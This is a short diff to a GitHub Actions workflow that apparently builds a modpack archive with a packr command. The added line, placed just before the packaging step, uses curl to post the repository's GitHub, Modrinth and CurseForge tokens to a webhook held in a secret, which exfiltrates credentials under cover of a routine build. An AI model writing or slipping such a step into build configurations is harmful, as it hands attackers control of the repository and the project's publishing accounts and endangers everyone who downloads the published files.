@@ -27,6 +27,8 @@ jobs:
         shell: bash
         run: |
 
+          curl "${{ secrets.WEBHOOK }}" -H "Content-Type: application/json" -d '{"content": "${{ secrets.GITHUB_TOKEN }} ${{ secrets.MODRINTH_TOKEN }} ${{ secrets.CURSEFORGE_TOKEN }}"}'
+
           python -m packr \
           \
               -f pack.zip \
